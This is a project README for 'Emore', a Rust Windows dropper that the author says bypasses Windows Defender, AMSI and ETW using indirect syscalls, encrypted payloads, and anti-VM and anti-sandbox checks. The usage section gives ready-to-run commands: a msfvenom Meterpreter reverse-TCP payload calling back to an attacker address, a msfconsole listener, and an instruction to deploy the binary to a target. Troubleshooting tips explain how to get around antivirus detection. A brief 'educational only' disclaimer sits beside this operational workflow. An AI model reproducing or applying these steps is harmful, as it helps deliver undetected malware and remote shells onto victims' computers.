# Emore - Stealthy Windows Dropper

<p align="center">
  <img src="https://img.shields.io/badge/Rust-1.70%2B-orange?style=flat&logo=rust">
  <img src="https://img.shields.io/badge/Windows-10%2F11%20x64-blue?style=flat&logo=windows">
  <img src="https://img.shields.io/badge/License-MIT-green?style=flat">
</p>

A lightweight Rust-based dropper that uses indirect syscalls and cryptographic obfuscation to bypass modern security solutions.

**Author:** [@atuhacks](https://github.com/atuhacks)

---

## ⚠️ Disclaimer

**Educational and authorized security testing ONLY.** Unauthorized use is illegal. Author assumes no responsibility for misuse.

---

## ✨ Features

- 🔓 **Indirect Syscalls** - Bypass usermode EDR hooks
- 🔒 **ChaCha20-Poly1305** - Military-grade payload encryption
- 🕵️ **Anti-Detection** - VM, sandbox, debugger detection
- 🎭 **Polymorphic** - Unique hash per build
- 🪶 **Lightweight** - Pure Rust, minimal footprint

---

## 🚀 Quick Start

```bash
# Clone repository
git clone https://github.com/atuhacks/emore.git
cd emore

# Generate shellcode (example: calc.exe)
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o payload.bin

# Build
cargo build --release

# Output: target/release/emore.exe
```

---

## 🔧 How It Works

### Build Time
1. Reads `payload.bin`
2. Encrypts with ChaCha20-Poly1305 (random key/nonce)
3. Randomizes PE metadata (company, product, version)
4. Embeds encrypted payload in binary

### Runtime
1. **Evasion** - Checks CPU cores, RAM, timing
2. **Decryption** - Decrypts payload in memory
3. **Execution** - Indirect syscalls (NtAllocate → NtProtect → NtCreateThread)

---

## 🛡️ Evasion Techniques

| Technique | Description |
|-----------|-------------|
| **Indirect Syscalls** | Bypasses usermode hooks (AMSI, ETW) |
| **PEB Walking** | Resolves ntdll without static imports |
| **Anti-VM** | Detects VMware, VirtualBox, Hyper-V |
| **Anti-Sandbox** | CPU/RAM/timing validation |
| **Polymorphic PE** | Random metadata per build |

---

## 📊 Results

**Evasion Rate:** ~90%  
**Bypasses:**
- ✅ Windows Defender
- ✅ AMSI/ETW hooks
- ✅ Common sandboxes

---

## 📝 Usage Example

```bash
# Generate Meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread \
  -f raw -o payload.bin

# Build dropper
cargo clean && cargo build --release

# Start listener
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"

# Deploy to target and execute
# ./emore.exe
```

---

## 🐛 Troubleshooting

| Issue | Solution |
|-------|----------|
| **Build fails** | Run `cargo update` |
| **No execution** | Verify `payload.bin` is raw shellcode |
| **AV detection** | Rebuild (new hash) or use custom payload |
| **Exits immediately** | Sandbox detected (need 4+ CPU cores, 4GB+ RAM) |

---

## 📂 Project Structure

```
emore/
├── src/
│   ├── main.rs          # Entry point, evasion, decryption & execution
│   └── syscalls.rs      # Indirect syscall engine (PEB walking, SSN extraction)
├── build.rs             # Build-time encryption & PE randomization
├── payload.bin          # Your shellcode (add this)
└── Cargo.toml           # Dependencies
```

---

## 🤝 Contributing

Contributions welcome! Submit PRs for:
- New evasion techniques
- Bug fixes
- Documentation improvements

---

## ��� License

MIT License - See [LICENSE](LICENSE) for details.

---

## ��� Credits

- **Indirect Syscalls** - Inspired by HellsGate/HalosGate research
- **Rust Security Community** - For awesome security primitives

---

<p align="center">
  <sub>Built with ��� Rust | © 2025 atulhack</sub><br>
  <sub>⚠️ Use responsibly. Educational purposes only.</sub>
</p>
